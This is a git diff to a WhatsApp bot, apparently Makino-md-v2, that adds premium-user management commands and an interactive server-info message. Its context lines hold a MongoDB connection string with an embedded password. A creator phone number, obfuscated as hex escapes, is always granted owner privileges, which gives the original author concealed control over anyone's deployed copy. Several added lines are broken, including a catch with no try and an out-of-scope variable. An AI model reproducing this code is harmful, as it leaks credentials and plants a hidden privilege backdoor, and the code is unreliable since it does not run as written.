@@ -33,6 +33,7 @@ const { hentai } = require('./lib/scraper2.js');
 const { instadl } = require('./lib/instadl');
 const ty = eco.connect('mongodb+srv://Arch:1t6l2G0r6nagLlOb@cluster0.gedh4.mongodb.net/?retryWrites=true&w=majority');
 const { isLimit, limitAdd, getLimit, giveLimit, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require('./lib/limit.js');
+const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
 const githubstalk = require('./lib/githubstalk');
 let { covid } = require('./lib/covid.js');
 const { Gempa } = require("./lib/gempa.js");
@@ -149,6 +150,9 @@ if (global.db)
 
 
 //
+let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
+let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
+let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
 let isSleeping = false; // Move the declaration here.
 let banUser = JSON.parse(fs.readFileSync('./database/banUser.json'));
 let banchat = JSON.parse(fs.readFileSync('./database/banChat.json'));
@@ -214,6 +218,7 @@ module.exports = Taira = async (Taira, m, chatUpdate, store) => {
     const botNumber = await Taira.decodeJid(Taira.user.id)
     const author = `\x32\x33\x34\x37\x30\x38\x30\x39\x36\x38\x35\x36\x34`
     const isCreator = [author,botNumber, ...global.Owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+    const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
     const itsMe = m.sender == botNumber ? true : false
     const text = args.join(" ")
     const from = m.chat
@@ -249,6 +254,12 @@ module.exports = Taira = async (Taira, m, chatUpdate, store) => {
     const content = JSON.stringify(m.message)
     const q = args.join(' ')
     // const button = m.body
+    const { xeontext1 } = require('./src/xeontext1')
+    const { xeontext2 } = require('./src/xeontext2')
+    const { xeontext3 } = require('./src/xeontext3')                   
+    const { xeontext4 } = require('./src/xeontext4')
+    const { xeontext5 } = require('./src/xeontext5')
+    const { xeontext6 } = require('./src/xeontext6')
 
     const isQuotedVideo = m.mtype === 'extendedTextMessage' && content.includes('videoMessage')
     const isQuotedAudio = m.mtype === 'extendedTextMessage' && content.includes('audioMessage')
@@ -741,8 +752,8 @@ Typed *surrender* to surrender and admited defeat`
    const responses = {
    
   hello: `Hello ${pushname}, I am ${BotName}. My current prefix is "${prefix}". How can I help you?`,
-  taira: `Taira Makino,My Creator is lost in Anime World, and I lost connection with him...`,
-  makino: `Taira Makino,My creator is lost in Anime World, and I lost connection with him...`,
+  taira: `That's my creator name 😊 ,Thank you for using a bot from him...`,
+  makino: `That's my Creator name ,Thank you for using a bot from him 🤗 ...`,
   fred: `I am busy,will reply you when I f33l like (¬_¬)ﾉ...`,
   runtime: `Hey ${pushname}\n${nowtime}\n\nMy runtime:${runtime(process.uptime())}\n\nPrefix is: *${prefix}*\n\nTime: ${kaitime}\n\nDate: ${kaidate}\n\nToday is ${currentDay}`,
   konichiwa: `Konichiwa ${pushname}, I am ${BotName}. How can I help you?`,
@@ -810,6 +821,58 @@ const smallinput = budy.toLowerCase();
 
 
     switch (command) {
+
+case 'addprem':
+                if (isBan) return m.reply(mess.banned);                             
+		if (isBanChat) return m.reply(mess.bangc);
+                if (!isCreator) return m.reply(mess.botowner)                                                                                  
+		if (args.length < 2)                                                                                                                     
+		return m.reply(`Use :\n*/addprem* @tag time\n*/addprem* number time\n\nExample : /addprem @tag 30d`);
+                if (m.mentionedJid.length !== 0) {
+                    for (let i = 0; i < m.mentionedJid.length; i++) {
+                        addPremiumUser(m.mentionedJid[0], args[1], premium);
+                    }
+                    m.reply("Successfully added to premium 🥂 ")
+                } else {
+                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
+                    m.reply("Successfully added to premium 🥂")                                                                                                           
+		}
+                break
+            case 'delprem':                                                                                                                          
+		if (isBan) return m.reply(mess.banned);                             
+		if (isBanChat) return m.reply(mess.bangc);
+                if (!isCreator) return m.reply(mess.botowner)
+                if (args.length < 1) return m.reply(`Use :\n*#delprem* @tag\n*#delprem* number`);                                                
+		    if (m.mentionedJid.length !== 0) {
+                    for (let i = 0; i < m.mentionedJid.length; i++) {                                                                                        
+			premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
+                        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));                                                            
+		    }                                                                                                                                    
+		    m.reply("User deleted from premium 🥂")                                                                                                    
+		    } else {                                                                                                                                 
+		   premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);                                                         
+		   fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
+                    m.reply("User deleted from previous 🥂")                                                                                                           
+		    }
+                break
+            case 'listprem': {
+                if (isBan) return m.reply(mess.banned);                             
+		if (isBanChat) return m.reply(mess.bangc);
+                if (!isCreator) return m.reply(mess.botowner)
+                let data = require("./database/premium.json")
+                let txt = `*------ᐖ「 PREMIUM LIST 」ᐖ------*\n\n`
+                for (let i of data) {
+                    txt += `Number : ${i.id}\n`
+                    txt += `Expired : ${i.expired} Second\n`
+                }
+                Taira.sendMessage(m.chat, {
+                    text: txt,
+                    mentions: i
+                }, {
+                    quoted: m
+                })
+            }
+            break
 
   case 'setprefix': {
   
@@ -942,26 +1005,71 @@ const smallinput = budy.toLowerCase();
       case 'server':
       case 'sysinfo': {
 
-        const respon = `
-  🤖 *🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ
-        b Server Info* 🤖
+        let respon = `
+     Makino-md-v2 Server
   
   *System*: ${systemName}
-  
   *RAM*: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
-  
   *NodeJS Memory Usage*: ${Object.keys(used).map(key => `${key}: ${formatp(used[key])}`).join(', ')}
-  
-  *Total CPU Usage*: ${totalCpuUsage}%
-  
-  *CPU Model*: ${cpu.model.trim()} (${cpu.speed} MHz)
-  
-  *Runtime*: ${runtime(process.uptime())}
-  
+  *Total CPU Usage*: ${totalCpuUsage}%  
+  *CPU Model*: ${cpu.model.trim()} (${cpu.speed} MHz)  
+  *Runtime*: ${runtime(process.uptime())}  
   *Response Speed*: ${latensie.toFixed(4)} seconds
   `.trim();
+	      
+          let msg = generateWAMessageFromContent(m.key.remoteJid, {
+            viewOnceMessage: {
+              message: {
+                "messageContextInfo": {
+                  "deviceListMetadata": {},
+                  "deviceListMetadataVersion": 2
+                },
+                interactiveMessage: proto.Message.InteractiveMessage.create({
+                  body: proto.Message.InteractiveMessage.Body.create({
+                    text: respon
+                  }),
+                  footer: proto.Message.InteractiveMessage.Footer.create({
+                    text: "By Tᴀɪʀᴀ Mᴀᴋɪɴᴏ"
+                  }),
+                  header: proto.Message.InteractiveMessage.Header.create({
+                    title: "©Tᴀɪʀᴀ•Mᴀᴋɪɴᴏ2024",
+                    subtitle: "🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ",
+                    hasMediaAttachment: false
+                  }),
+                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                    buttons: [
+                      {
+                        "name": "cta_url",
+                        "buttonParamsJson": "{\"display_text\":\"Repo🔗\",\"url\":\"https://github.com/anonphoenix007/MAKINO-MD-V2\",\"merchant_url\":\"https://github.com/anonphoenix007/MAKINO-MD-V2\"}"
+                      },
+		      {
+                        "name": "cta_url",
+                        "buttonParamsJson": "{\"display_text\":\"Channel📍 \",\"url\":\"https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K\"}"
+		      },
+		      {
+                        "name": "cta_url",
+                        "buttonParamsJson": "{\"display_text\":\"Taira😎\",\"url\":\"https://wa.me/2347080968564\",\"merchant_url\":\"https://wa.me/2347080968564\"}"
+		      },
+                    ]
+                  })
+                })
+              }
+            }
+          }, {});
 
-        m.reply(respon);
+          if (!msg || !msg.key || !msg.key.remoteJid || !msg.key.id) {
+            const errorMessage = 'Error: Invalid message key.';
+            console.error(errorMessage);
+            return reply(errorMessage);
+          }
+
+          await Taira.relayMessage(msg.key.remoteJid, msg.message, {
+            messageId: msg.key.id
+          });
+        } catch (error) {
+          console.error('Error generating and relaying message:', error);
+          return reply('Error generating and relaying message.');
+        }
         break;
       }
 
